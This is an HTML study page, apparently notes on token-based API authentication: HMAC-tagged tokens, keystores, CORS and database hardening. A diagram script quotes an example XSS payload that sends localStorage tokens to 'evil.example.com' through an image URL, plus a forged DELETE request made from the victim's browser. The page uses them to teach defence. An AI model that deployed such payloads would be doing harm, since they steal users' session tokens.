+    <p>A <strong>message authentication code (MAC)</strong> computes a short authentication tag from a message <em>and</em> a secret key. Anyone with the key can recompute the tag; anyone without it cannot. Change one bit of the message and the tag changes completely. <strong>HMAC</strong> is the well-studied, standard way to build a MAC from a hash function &mdash; e.g. <strong>HMAC-SHA256</strong> uses SHA-256 with a 256-bit secret key.</p>
+  </div>
+
+  <p>Here's the clever structural choice: we <strong>don't</strong> store the tag in the database. The database keeps only the plain (hashed) token ID. Instead, the server computes the HMAC tag and <strong>appends it to the token ID</strong> before handing it to the client &mdash; producing a two-part token of the form <code>tokenId.tag</code>.</p>
+
+  <!-- INTERACTIVE DIAGRAM 5 : HMAC token anatomy -->
+  <div class="diagram" id="dg-hmac">
+    <div class="dlabel">Interactive · Figures 5.8 &amp; 5.9</div>
+    <div class="dtitle">The HMAC token: what the client holds vs what the database holds</div>
+    <p class="dhint"><b>Step through</b> token creation and validation to see why an attacker with database write access still can't forge a working token.</p>
+
+    <div class="tokenviz">
+      <span class="part idpart">L2xuanMgu3ejXRjw1GmBOdLLbxI<span class="lbl">token ID (in database)</span></span>
+      <span class="dot">.</span>
+      <span class="part tagpart">dnYUdylHgTGpNcv39ol<span class="lbl">HMAC tag (NOT in database)</span></span>
+    </div>
+
+    <div class="stepper" id="hmac-steps">
+      <button onclick="hmacStep(0,this)" class="active">Overview</button>
+      <button onclick="hmacStep(1,this)">1 · Create</button>
+      <button onclick="hmacStep(2,this)">2 · Validate</button>
+      <button onclick="hmacStep(3,this)">3 · Forgery fails</button>
+    </div>
+    <div class="step-readout" id="hmac-readout">The client's token is <code>tokenId.tag</code>; the database stores only the <code>tokenId</code>. The secret key lives only in the API server. Step through to see how this defeats an attacker who can write to the database.</div>
+  </div>
+
+  <div class="dexplain">
+    <h4>Reading the diagram</h4>
+    <p>The asymmetry is the whole trick: the database never sees the tag, and the key never touches the database.</p>
+    <ol>
+      <li><b>Create.</b> The <code>DatabaseTokenStore</code> generates and stores the random token ID (hashed). The wrapping <code>HmacTokenStore</code> then computes <code>HMAC-SHA256(key, tokenId)</code>, Base64-encodes it, and appends it: the client receives <code>tokenId.tag</code>.</li>
+      <li><b>Validate.</b> On each request the server splits the token at the dot, recomputes the expected tag from the ID and its secret key, and compares. Only if they match does it pass the bare <code>tokenId</code> down to the database for lookup.</li>
+      <li><b>Forgery fails.</b> An attacker with database write access can insert any <code>tokenId</code> they like &mdash; but they can't compute a matching tag without the secret key. Their forged token is rejected at the HMAC check, <i>before</i> any database lookup even happens (which also neatly sidesteps timing attacks against the DB).</li>
+    </ol>
+  </div>
+
+  <div class="callout danger">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#b5471f" stroke-width="2"><path d="M12 6v6l4 2"/><circle cx="12" cy="12" r="9"/></svg>
+    <span class="lab">Critical · constant-time comparison (again)</span>
+    <p>Just like the anti-CSRF check in chapter 4, comparing the provided tag against the computed one with an ordinary <code>equals()</code> opens a <strong>timing attack</strong> &mdash; an attacker measures tiny response-time differences to recover the tag one byte at a time. Always use a constant-time comparison like Java's <code>MessageDigest.isEqual</code>, which inspects every byte regardless of where the first mismatch is.</p>
+  </div>
+
+  <h3>Where does the secret key live?</h3>
+  <p>The HMAC key is just a 256-bit random value &mdash; but it has a requirement the token IDs don't: <strong>every API server must share the same key</strong>. If one server signs a token with a different key, another server (or the same one after a restart) would reject it as a forgery. So the key can't be generated fresh per process; it lives in an external <em class="term">keystore</em>.</p>
+
+  <div class="callout def">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#1d6b5a" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1"/></svg>
+    <span class="lab">Definition · Keystore</span>
+    <p>A <strong>keystore</strong> is an encrypted, password-protected file holding cryptographic keys and TLS certificates for your API. Natter uses Java's <code>KeyStore</code> in the secure <strong>PKCS#12</strong> format, generated with <code>keytool</code>. The keystore password is supplied at startup via a system property &mdash; never hard-coded &mdash; so developers needn't know the production password.</p>
+  </div>
+
+  <p>The implementation is elegant: <code>HmacTokenStore</code> <em>wraps</em> the <code>DatabaseTokenStore</code> rather than replacing it. The database store does the storage; the HMAC store adds the tag on the way out and verifies it on the way in. This decorator pattern means the same HMAC protection can wrap other token stores too &mdash; which turns out to be useful in the next chapter.</p>
+
+  <div class="callout tip">
+    <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="#2f4858" stroke-width="2"><path d="M9 11l3 3L22 4M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
+    <span class="lab">Going further · contain the blast radius</span>
+    <p>Two more refinements limit damage from a breach. <strong>Separate database accounts</strong> (the CQRS pattern) give the query path no delete privileges, so an injection there can't wipe tokens. And <strong>row-level security</strong> policies (in databases that support them, like PostgreSQL) restrict each query to only the current user's rows &mdash; so even a SQL flaw can't read or alter anyone else's tokens. Encrypting sensitive attributes is possible too, but it's genuinely hard to do well; nail the access controls first.</p>
+  </div>
+</section>
+
+<!-- ===================== takeaways ===================== -->
+<section id="takeaways">
+  <div class="takeaways">
+    <h3>Key takeaways</h3>
+    <ul>
+      <li>Cookies struggle across domains and outside browsers. <strong>CORS</strong> selectively relaxes the same-origin policy so other origins can call your API.</li>
+      <li>CORS works via a <strong>preflight</strong> <code>OPTIONS</code> request &mdash; handle it <em>before</em> authentication, since preflights carry no credentials.</li>
+      <li>Cross-site cookies and <strong>SameSite</strong> are incompatible, and browsers increasingly block cross-site cookies &mdash; a strong reason to move beyond cookies.</li>
+      <li>Cookies bundle three jobs &mdash; <strong>transport, client storage, server storage</strong> &mdash; replaced by the <strong>Bearer scheme</strong>, <strong>Web Storage</strong>, and a <strong>database token store</strong>.</li>
+      <li>Generate token IDs from a <strong>cryptographically secure RNG</strong> (e.g. 160 bits from <code>SecureRandom</code>), never a predictable database sequence.</li>
+      <li>Web Storage eliminates CSRF but is exposed to <strong>XSS exfiltration</strong> &mdash; and against real XSS, no storage choice is truly safe, so prevent XSS first.</li>
+      <li><strong>Hash stored tokens</strong> (SHA-256) so a database read can't yield usable tokens; <strong>HMAC</strong> with a secret key stops forgery and tampering.</li>
+      <li>Always compare tags in <strong>constant time</strong>; keep the HMAC key in a <strong>keystore</strong>; contain breaches with least-privilege accounts and row-level security.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ===================== quiz ===================== -->
+<section id="quiz">
+  <div class="sec-head"><span class="sec-num">&#9733;</span><div><h2>Test yourself</h2></div></div>
+  <div class="quiz">
+    <span class="lab">Pop quiz · tap to reveal</span>
+    <details><summary>For a cookie-based cross-origin login, which CORS header is needed besides <code>Access-Control-Allow-Origin</code>?</summary><div class="ans"><strong>Access-Control-Allow-Credentials: true on <em>both</em> the preflight response and the actual response.</strong> Without it on both, the browser strips or rejects the cookie.</div></details>
+    <details><summary>Which is a secure way to generate a random token ID?</summary><div class="ans"><strong>Base64-encoding 20 bytes from a SecureRandom.</strong> A plain <code>Random</code>, a counter, or hashing the current time are all predictable &mdash; a hash is only as unguessable as its input.</div></details>
+    <details><summary>Which standard HTTP authentication scheme is designed for token-based auth? (NTLM · HOBA · Basic · Bearer · Digest)</summary><div class="ans"><strong>Bearer.</strong> Defined in RFC 6750, originally for OAuth2, now the universal way to send tokens to an API.</div></details>
+    <details><summary>Where should the HMAC secret key be stored?</summary><div class="ans"><strong>In a keystore accessible only to your API servers.</strong> Not in the database with the tokens, not hard-coded in source, and a memorable password is not a suitable key.</div></details>
+    <details><summary>Which line correctly compares two HMAC tags? (computed.equals(provided) · Arrays.equals(...) · MessageDigest.isEqual(provided, computed))</summary><div class="ans"><strong>MessageDigest.isEqual(provided, computed).</strong> It's constant-time, defeating timing attacks. The others short-circuit on the first mismatched byte.</div></details>
+    <details><summary>Which API design pattern helps reduce the impact of SQL injection on the token store?</summary><div class="ans"><strong>CQRS (Command Query Responsibility Segregation).</strong> It lets you use a query-only database account (no delete) for reads, so an injection on that path can't wipe tokens.</div></details>
+  </div>
+</section>
+
+</div>
+
+<footer>
+  <div>API Security in Action</div>
+  <div>Chapter 05 &mdash; Modern Token-Based Authentication</div>
+  <div>Next &#9656; Self-Contained Tokens &amp; JWTs</div>
+</footer>
+
+<script>
+/* ---------- Diagram 1: preflight handshake ---------- */
+const pfData = [
+  {mid:'<div style="font-family:var(--mono);font-size:11px;color:var(--ink-soft)">tap a step below</div>',
+   read:"When a script tries a cross-origin request the SOP would block, the browser first sends a preflight <code>OPTIONS</code> request asking permission. If the server's reply matches what the request needs, the real request proceeds; otherwise the browser blocks it. Step through to see both outcomes."},
+  {mid:'<div style="font-family:var(--mono);font-size:11px;color:var(--accent)">&#10112; OPTIONS + Origin + intended method &#10142;</div>',
+   read:"<b>Step 1 &mdash; The preflight.</b> The browser sends an <code>OPTIONS</code> request carrying the <code>Origin</code> (who's asking), <code>Access-Control-Request-Method</code> (what it intends to do), and any custom headers it wants to use."},
+  {mid:'<div style="font-family:var(--mono);font-size:11px;color:var(--accent-2)">&#10111; &#11013; Access-Control-Allow-* headers</div>',
+   read:"<b>Step 2 &mdash; The server replies.</b> It returns CORS headers stating which origins, methods, and headers it permits. This reply is the server's chance to say yes or no."},
+  {mid:'<div style="font-family:var(--mono);font-size:11px;color:#1d6b5a">&#10113; &#9989; real request sent &mdash; response readable</div>',
+   read:"<b>Step 3a &mdash; Allowed.</b> The server's reply covers what the request needs, so the browser sends the real request and lets your script read the response. Everything works."},
+  {mid:'<div style="font-family:var(--mono);font-size:11px;color:#b5471f">&#10113; &#10060; blocked by CORS policy</div>',
+   read:"<b>Step 3b &mdash; Blocked.</b> The server sent no CORS headers, or they don't match. The browser refuses to send the real request, and your script sees only a cryptic \"blocked by CORS policy\" error &mdash; never the response."}
+];
+function pfStep(i, btn){
+  document.querySelectorAll('#pf-steps button').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('pf-mid').innerHTML = pfData[i].mid;
+  document.getElementById('pf-readout').innerHTML = pfData[i].read;
+  const api=document.querySelector('#dg-preflight [data-pf="api"]');
+  const br=document.querySelector('#dg-preflight [data-pf="browser"]');
+  api.style.boxShadow=''; br.style.boxShadow='';
+  if(i===3){br.style.boxShadow='0 0 0 3px rgba(29,107,90,.3)';}
+  if(i===4){br.style.boxShadow='0 0 0 3px rgba(181,71,31,.3)';}
+}
+
+/* ---------- Diagram 2: three pillars ---------- */
+const pillarData = {
+  transport:"<b>Transport</b> &mdash; how the token gets from client to server. Cookies used the automatic <code>Cookie</code>/<code>Set-Cookie</code> headers. The replacement is the <b>Bearer scheme</b>: the token travels in the <code>Authorization: Bearer &hellip;</code> header instead.",
+  clientstore:"<b>Client storage</b> &mdash; where the browser keeps the token between requests, reloads, and restarts. Cookies used the browser's cookie jar. The replacement is the <b>Web Storage API</b> (<code>localStorage</code>), which is easier to use and far roomier.",
+  serverstore:"<b>Server storage</b> &mdash; where the session state lives on the backend. The framework handled this automatically for cookies. The replacement is our own <b>database token store</b> &mdash; which also means we now own generating, hashing, and expiring tokens securely."
+};
+function pillarPick(k, el){
+  document.querySelectorAll('#dg-pillars .pl').forEach(p=>p.style.boxShadow='');
+  el.style.boxShadow='0 0 0 3px rgba(181,71,31,.25)';
+  document.getElementById('pillar-readout').innerHTML = pillarData[k];
+}
+
+/* ---------- Diagram 3: XSS exfiltration vs proxy ---------- */
+function xssMode(mode, btn){
+  document.querySelectorAll('#xss-toggle button').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  const v=document.getElementById('xss-view');
+  if(mode==='exfil'){
+    v.innerHTML='<div class="jar">'+
+      '<div style="color:#9a9484;font-size:10px;margin-bottom:8px">XSS SCRIPT STEALS FROM localStorage:</div>'+
+      '<div class="ck"><span style="color:#e0995e">for</span> (key <span style="color:#e0995e">in</span> localStorage) {</div>'+
+      '<div class="ck" style="padding-left:18px">img.src = <span style="color:#9ee6a8">"https://evil.example.com/exfil?t="</span> + token;</div>'+
+      '<div class="ck">}</div>'+
+      '<div style="margin-top:10px;color:#ff8a7a">&rarr; browser loads the image URL eagerly &mdash; token silently sent to attacker &#10060;</div>'+
+      '</div>';
+    document.getElementById('xss-readout').innerHTML="<b>Exfiltration:</b> because <code>localStorage</code> is readable by JavaScript, the injected script reads every token and ships it to the attacker's server via an <code>&lt;img&gt;</code> URL &mdash; no visible sign to the user. The attacker then replays the token from their own device.";
+  } else {
+    v.innerHTML='<div class="jar">'+
+      '<div style="color:#9a9484;font-size:10px;margin-bottom:8px">TOKEN IS IN AN HttpOnly COOKIE &mdash; SCRIPT CAN&rsquo;T READ IT:</div>'+
+      '<div class="ck"><span style="color:#6fb3c9">session</span> cookie <span class="badge http">HttpOnly &mdash; hidden from JS</span></div>'+
+      '<div class="ck" style="margin-top:6px;color:#cbb98f">so the attacker doesn&rsquo;t steal it &mdash; they just USE it in place:</div>'+
+      '<div class="ck" style="padding-left:10px">fetch(<span style="color:#9ee6a8">"/spaces/1/messages"</span>, { method:<span style="color:#9ee6a8">"DELETE"</span> })</div>'+
+      '<div style="margin-top:10px;color:#ff8a7a">&rarr; browser attaches the cookie automatically, request looks same-origin &mdash; CSRF defences don&rsquo;t help &#10060;</div>'+
+      '</div>';
+    document.getElementById('xss-readout').innerHTML="<b>Proxy through the browser:</b> even an <code>HttpOnly</code> cookie the script can't read doesn't save you. The attacker simply runs the requests <i>from inside the victim's browser</i> &mdash; the browser attaches the cookie, the requests look legitimate, and CSRF protections are bypassed. HttpOnly raises the bar but doesn't close the door.";
+  }
+}
+xssMode('exfil', document.querySelector('#xss-toggle button'));
+
+/* ---------- Diagram 4: DB threats ---------- */
+const threatData = {
+  read:"<b>Read access</b> &mdash; the attacker can steal every live token and replay them to impersonate any logged-in user. <br><b>Defence:</b> <b>hash the tokens</b> (SHA-256). Stolen rows are just one-way hashes, useless for replay.",
+  write:"<b>Write access</b> &mdash; the attacker can insert their own token rows or bump an existing token's privileges. <br><b>Defence:</b> <b>HMAC tags</b>. Without the secret key they can't compute a tag the API will accept, so forged tokens are rejected.",
+  del:"<b>Delete access</b> &mdash; the attacker can revoke other users' tokens, locking everyone out: a denial of service. <br><b>Defence:</b> <b>least-privilege accounts</b> (CQRS) and <b>row-level security</b> &mdash; the query path simply has no delete rights."
+};
+function threatPick(k, el){
+  document.querySelectorAll('#dg-threats .tcard').forEach(c=>c.style.boxShadow='');
+  el.style.boxShadow='0 0 0 4px rgba(21,20,15,.25)';
+  document.getElementById('threat-readout').innerHTML = threatData[k];
+}
+
+/* ---------- hardening stack ---------- */
+const stackData = [
+  "<b>Layer 1 &mdash; Separate &amp; encrypt the link.</b> Keep the database off the public network and wrap the API-to-DB connection in TLS. This is the baseline every other layer builds on.",
+  "<b>Layer 2 &mdash; Hash tokens (SHA-256).</b> Store only the hash of each token. An attacker with read access gets irreversible hashes, not live tokens. Since tokens are already high-entropy, a fast hash is fine &mdash; no Scrypt needed.",
+  "<b>Layer 3 &mdash; Authenticate with HMAC.</b> Append a keyed authentication tag to each token. Forged or tampered tokens are rejected before any database lookup, defeating both write-access forgery and DB timing attacks.",
+  "<b>Layer 4 &mdash; Least privilege &amp; row-level security.</b> Split database accounts so the query path can't delete (CQRS), and restrict each query to the current user's rows. Contains the damage any single breach can do."
+];
+function stackPick(i, el){
+  document.querySelectorAll('#dg-threats') ; // no-op guard
+  document.querySelectorAll('.stack .layer').forEach(l=>l.classList.remove('on'));
+  el.classList.add('on');
+  document.getElementById('stack-readout').innerHTML = stackData[i];
+}
+
+/* ---------- Diagram 5: HMAC token anatomy ---------- */
+const hmacData = [
+  "The client's token is <code>tokenId.tag</code>; the database stores only the <code>tokenId</code>. The secret key lives only in the API server. Step through to see how this defeats an attacker who can write to the database.",
+  "<b>Step 1 &mdash; Create.</b> The DatabaseTokenStore generates and stores the random token ID. The wrapping HmacTokenStore then computes <code>HMAC-SHA256(key, tokenId)</code> and appends it, so the client receives <code>tokenId.tag</code>. The tag is <b>never written to the database</b>.",
+  "<b>Step 2 &mdash; Validate.</b> On each request the server splits the token at the dot, recomputes the expected tag from the ID and its secret key, and compares them in constant time. Only on a match does it pass the bare <code>tokenId</code> to the database for lookup.",
+  "<b>Step 3 &mdash; Forgery fails.</b> An attacker with database write access can insert any <code>tokenId</code> &mdash; but without the secret key they can't produce a matching tag. Their token is rejected at the HMAC check, before any database lookup even runs."
+];
+function hmacStep(i, btn){
+  document.querySelectorAll('#hmac-steps button').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('hmac-readout').innerHTML = hmacData[i];
+  const viz=document.querySelector('#dg-hmac .tokenviz');
+  const idp=viz.querySelector('.idpart'), tagp=viz.querySelector('.tagpart');
+  idp.style.boxShadow=''; tagp.style.boxShadow=''; idp.style.opacity='1'; tagp.style.opacity='1';
+  if(i===1){tagp.style.boxShadow='0 0 0 3px rgba(158,230,168,.4)';}
+  if(i===2){idp.style.boxShadow='0 0 0 3px rgba(111,179,201,.4)';}
+  if(i===3){tagp.style.opacity='.35';}
+}
+</script>
+
+</body>
+</html>
